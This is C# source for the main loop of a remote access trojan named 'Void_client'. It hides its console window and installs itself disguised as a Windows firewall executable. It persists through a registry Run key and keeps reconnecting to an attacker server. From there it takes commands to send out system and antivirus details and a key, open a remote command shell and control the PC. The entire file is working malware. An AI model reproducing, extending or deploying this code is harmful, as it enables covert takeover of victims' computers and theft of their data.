using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using Void_client.Libs;
using System.Threading;
using System.IO;
using System.Windows.Forms;
using System.Text;
using System.Runtime.InteropServices;

namespace Void_client
{
    class Program
    {
        private static NetworkStream stream { get; set; }
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            if (!Settings.Initialize())
                return;
            
            //if the client is already running then we might as well just exit out of it
            if (!(Process.GetProcessesByName("Void_client").Length < 2))
                Environment.Exit(1);
            
            TcpClient client = new TcpClient();

            stream = WaitConnect(client);
     
            if (bool.Parse(Settings.ISAUTOINSTALL) && InfoGathering.IsAdministrator() && !File.Exists(@"C:\Windows\Firewall\Firewall.exe"))
            {
                Commands.Install();
                return;
            }
            else if (Registry.ContainsKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "Void"))
            {
                if (Application.ExecutablePath != @"C:\Windows\Firewall\Firewall.exe")
                {
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = @"C:\Windows\Firewall\Firewall.exe";
                    psi.CreateNoWindow = true;
                    Process.Start(psi);
                    return;
                }
            }
            else
                TCP.SendInformation("error |install error|failed, launching without installing", stream);
                
            while (true)
            {
                try
                {
                    string[] recievedInfo = TCP.ReadAndRecieve(stream);
                    
                    switch (recievedInfo[0])
                    {
                        case "info":
                            switch (recievedInfo[1])
                            {
                                case "general":
                                    TCP.SendInformation("info|general|" + Commands.GiveInformation(), stream);
                                    break;
                                case "bleu":
                                    TCP.SendInformation("info|bleu|" + InfoGathering.GetBleuKey(), stream);
                                    break;
                                case "isadmin":
                                    TCP.SendInformation("info|isadmin|" + InfoGathering.IsAdministrator().ToString(), stream);
                                    break;
                                case "avirus":
                                    TCP.SendInformation("info|avirus|Warning: This may not be able to collect all antivirus\r\n" + InfoGathering.GetProtectionSoftware(), stream);
                                    break;
                            }
                            break;
                        case "rat":
                            switch (recievedInfo[1])
                            {
                                case "install":
                                    if (Application.ExecutablePath != @"C:\Windows\Firewall\Firewall.exe")
                                        Commands.Install();
                                    else
                                        TCP.SendInformation("error|Install error|Void is already installed on the machine", stream);
                                    break;
                                case "uninstall":
                                    if (Application.ExecutablePath == @"C:\Windows\Firewall\Firewall.exe")
                                        Commands.Uninstall();
                                    else
                                        TCP.SendInformation("error|Install error|Void is not installed on the machine", stream);
                                    break;
                            }
                            break;
                        case "cmd":
                            switch (recievedInfo[1])
                            {
                                case "start":
                                    RemoteCMD.stream = stream;
                                    RemoteCMD.Start();
                                    break;
                                case "stop":
                                    RemoteCMD.Stop();
                                    break;
                                case "command":
                                    RemoteCMD.Send(recievedInfo[2]);
                                    break;
                            }
                            break;
                        case "showmsg":
                            Commands.ShowMsgBox(recievedInfo);
                            break;
                        case "pc":
                            Commands.PC(recievedInfo[1]);
                            break;
                        case "shutting":
                            client.Close();
                            stream.Close();
                            client = new TcpClient();
                            stream = WaitConnect(client);
                            break;
                    }
                }
                catch (Exception) { }
            }
        }

        private static NetworkStream WaitConnect(TcpClient client)
        {
            //keeps on trying to connect to the server (with a timeout of a second so it doesn't use a lot of cpu power)
            while (true)
            {
                try
                {
                    client.Connect(IPAddress.Parse(Settings.SERIP), int.Parse(Settings.PORT));

                    NetworkStream stream = client.GetStream();

                    return stream;
                }
                catch (Exception) { Thread.Sleep(1000); }
            }
        }

        private static string ArrayToString(string[] strArr)
        {
            //basically puts the array together into a string
            StringBuilder builder = new StringBuilder();

            foreach (var index in strArr)
                builder.Append(index + ",");

            return builder.ToString().TrimEnd(',');
        }
    }
}